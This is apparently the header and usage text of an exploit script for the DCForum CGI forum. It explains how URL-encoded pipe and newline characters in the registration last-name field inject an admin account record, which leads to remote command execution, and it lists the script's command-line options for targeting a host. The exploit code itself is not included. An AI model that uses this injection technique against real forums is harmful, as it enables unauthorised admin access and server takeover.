#DCForum is a commercial cgi script from DCScripts which is designed to facilitate web-based threaded discussion forums.
#
#Versions of DCForum are vulnerable to attacks which can yield an elevation of privileges and remote execution of arbitrary commands.
#
#DCForum maintains a file containing its user account information, including hashed user passwords and other potentially sensitive information.
#
#When a new user account is created, the user's information is written to this file. Fields within each record are delimited by pipe ('|') and newline characters.
#
#DCForum fails to properly validate this user-supplied account information. As a result, an attacker can cause a corruption of the script's user records by providing a value for the last name field which includes URL-encoded pipes and newlines. By appending desired values to the last name field, an attacker can insert account information for a new user, and specify admin privileges.
#
#This newly-created admin account allows a remote attacker to issue arbitrary commands with the privilege level of the webserver process.

Usage: $0 [options] host [path to dcboard.cgi]

Options:
   -a to activate the account (for sites that do not activate automatically)
  NOTE: This option is not yet supported, but should be quite easy to add if you need it

  -p to leave the password in plaintext (necessary when the target is NT)

The path to dcboard.cgi, if not supplied, is assumed to be /cgi-bin/dcforum/dcboard.cgi
